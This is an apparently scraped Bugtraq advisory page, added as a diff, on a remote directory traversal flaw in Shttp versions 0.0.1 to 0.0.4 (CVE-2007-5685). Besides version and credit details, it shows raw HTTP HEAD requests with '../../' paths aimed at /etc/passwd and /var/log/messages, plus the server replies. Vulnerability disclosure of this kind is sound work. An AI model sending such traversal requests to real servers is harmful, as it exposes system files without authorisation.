@@ -1,0 +1,108 @@
+#SpeeDr00t@Black Falcon<br>#bid26212<p><b><span style="font-size: 18pt;">Shttp Remote Directory Traversal Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/26212/info">info</a><br><a href="http://www.securityfocus.com/bid/26212/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/26212/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/26212/solution">solution</a><br><a href="http://www.securityfocus.com/bid/26212/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				26212
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2007-5685<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Oct 25 2007 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				May 07 2015 05:34PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Pete Foster is credited with the discovery of this vulnerability.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Vito Caputo Shttp 0.0.4 <br/>
+					
+				
+					Vito Caputo Shttp 0.0.3 <br/>
+					
+				
+					Vito Caputo Shttp 0.0.2 <br/>
+					
+				
+					Vito Caputo Shttp 0.0.1 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					Vito Caputo Shttp 0.0.5 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	To exploit this issue, attackers can use readily available network utilities.<br/><br/>The following HTTP requests demonstrate this issue:<br/><br/>HEAD /../../etc/passwd HTTP/1.0 <br/> <br/>HTTP/1.1 400 Bad Request <br/>Content-Type: text/html <br/>Server: Shttp/ServerKit <br/>Date: Thu, 25 Oct 2007 16:31:30 GMT <br/>Connection: close <br/> <br/> <br/>HEAD /../../var/log/messages HTTP/1.0 <br/> <br/>HTTP/1.1 200 OK <br/>Content-Length: 178455 <br/>Content-Type: text/plain <br/>Last-Modified: Thu, 25 Oct 2007 16:36:39 GMT <br/>Server: Shttp/ServerKit <br/>Date: Thu, 25 Oct 2007 16:42:32 GMT <br/>Connection: close
+	
+		<ul>
+</ul>
+</div>
